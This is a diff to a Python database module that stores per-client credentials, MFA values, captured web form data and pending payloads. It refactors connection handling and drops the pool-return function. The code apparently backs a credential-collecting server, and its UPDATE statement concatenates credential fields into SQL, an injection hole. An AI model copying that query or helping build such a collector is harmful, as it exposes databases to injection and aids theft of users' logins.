@@ -28,9 +28,6 @@ def getConn():
     initDB()
     return conn_pool.get()
 
-def returnConn(conn):
-    global conn_pool
-    conn_pool.put(conn)
 
 
 """
@@ -78,8 +75,7 @@ returns 0 for ok, non-zero for bad data format
 """
 def store_credential(credentials, clientid):
     url = credentials.get("url", None)
-    try:
-        conn = getConn()
+    with getConn() as conn:
         cur = conn.cursor()
         if(credentials.get("Username", None) != None and url != None):
             checkUsername = credentials.get("Username", None)
@@ -96,8 +92,6 @@ def store_credential(credentials, clientid):
                     execStr = "UPDATE Credentials SET MFA = '" + col6 + "' WHERE Username = '" + checkUsername + "' AND URL = '" + url + "' AND CID = " + str(clientid)
                     cur.execute(execStr)
             conn.commit()
-    finally:
-        returnConn(conn)
     
     return 0
 
@@ -106,13 +100,10 @@ def store_payload(clientid):
     payload = pending_payloads.pop(clientid, None)
     if payload == None:
         return
-    try:
-        conn = getConn()
+    with getConn() as conn:
         cur = conn.cursor()
         cur.execute("insert into PendingPayloads values (%s, %s) on duplicate key update Payload=(%s) where ClientID=(%s)", (clientid, payload, payload, clientid))
         conn.commit()
-    finally:
-        returnConn(conn)
     
 
 
@@ -129,8 +120,7 @@ def store_form_data(data, clientid):
     if url == None:
         return -1
     reducedURL = url.split('/')[0] + "//" + url.split('/')[2] + "/"
-    try:
-        conn = getConn()
+    with getConn() as conn:
         cur = conn.cursor()
         cur.execute('SELECT * FROM FormIDMappings WHERE URL = (%s) OR URL = (%s)', (reducedURL, "*"))
         test = cur.fetchall()
@@ -267,5 +257,3 @@ def store_form_data(data, clientid):
                 if(cur.rowcount != 0):
                     cur.execute('INSERT INTO ComplexForms(CID, JSONFORM) VALUES (%s, %s)', (clientid, complexData))
         conn.commit()
-    finally:
-        returnConn(conn)
